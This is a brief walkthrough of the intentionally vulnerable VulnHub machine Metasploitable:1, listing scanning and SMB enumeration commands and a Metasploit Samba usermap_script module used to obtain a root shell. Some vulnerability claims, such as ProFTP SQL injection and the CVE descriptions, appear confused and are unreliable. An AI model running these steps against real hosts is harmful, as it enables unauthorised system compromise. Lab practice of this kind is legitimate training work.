
# Metasploitable:1  Walkthrough 

**VulnHub Link:** [Metasploitable:1](https://www.vulnhub.com/entry/metasploitable-1,28/)
**Difficulty:** Easy
**Release Date:** 19 May 2010

## 1.Reconnaissance
```bash
rustscan -a 172.16.147.132 --ulimit 5000 -r 1-10000
nmap -sC -T5  -A -O  -sV 172.16.147.132 -p21,22,23,25,53,80,139,445,3306,3632,5432,8009,8180
```

We find out ProFTP 1.3.1 and it is vulnerable to SQL Injection but unfortunately i couldn't do that(

Vulnerabilities: 
- CVE-2011-4130 (mod_copy command execution)
- CVE-2010-4221 (arbitrary file upload)


## 2.Enumeration
```bash
enum4linux 172.16.147.132
smbclient //172.16.147.132/tmp -N
```

We got SMB shell but it did not help us((

But , when we search Samba SMB 3.0.20 , We found some vulnerabilities

https://www.exploit-db.com/exploits/16320

## 3.Exploitation

```bash
msfconsole -q
use multi/samba/usermap_script 
```
and then we set options like RHOSTS , LHOST

and here we go , we got Root shell


